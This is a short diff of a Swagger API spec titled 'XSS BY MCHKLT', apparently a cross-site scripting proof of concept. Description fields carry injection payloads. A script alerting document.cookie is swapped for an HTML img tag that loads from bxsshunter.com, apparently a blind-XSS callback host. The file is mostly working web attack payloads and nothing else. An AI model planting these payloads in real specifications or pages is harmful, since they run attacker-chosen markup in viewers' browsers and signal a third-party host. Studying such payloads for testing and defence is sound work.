@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS BY MCHKLT
   description: |
-    "><h1>helloworld</h1><script>alert(document.cookie)</script>
+    "><h1>helloworld</h1><img src=https://bxsshunter.com/static/images/white.png>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            "><h1>helloworld</h1><script>alert(document.cookie)</script>
+            "><h1>helloworld</h1><img src=https://bxsshunter.com/static/images/white.png>
           format: int64
           in: path
           name: id
